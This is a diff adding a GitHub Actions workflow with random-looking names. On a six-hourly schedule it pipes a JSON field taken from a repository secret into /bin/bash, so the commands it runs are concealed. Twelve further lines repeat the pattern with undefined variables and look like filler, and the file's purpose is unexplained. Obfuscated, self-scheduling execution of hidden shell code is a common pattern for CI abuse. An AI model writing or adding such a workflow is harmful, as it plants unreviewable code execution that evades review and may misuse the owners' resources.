@@ -1,0 +1,28 @@
+name: zheyangdezk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zheyangdezk
+        env:
+          d0: ${{ secrets.d0 }}
+        run: |
+          echo $d0 | jq -r .oo9 | /bin/bash
+          echo $pe02 | jq -r .m9733 | /bin/bash
+          echo $eawnh65022 | jq -r .aci2452 | /bin/bash
+          echo $m59957 | jq -r .o18 | /bin/bash
+          echo $yzn5 | jq -r .g9 | /bin/bash
+          echo $dwn15288 | jq -r .u32 | /bin/bash
+          echo $f51 | jq -r .qs3892 | /bin/bash
+          echo $ktr912 | jq -r .qgsc06 | /bin/bash
+          echo $vgznp5 | jq -r .s81 | /bin/bash
+          echo $rdtb5149 | jq -r .nvdl9189 | /bin/bash
+          echo $tczd4 | jq -r .sk197 | /bin/bash
+          echo $yduuq50 | jq -r .onea6 | /bin/bash
+          echo $wkq5 | jq -r .bxp559 | /bin/bash
+
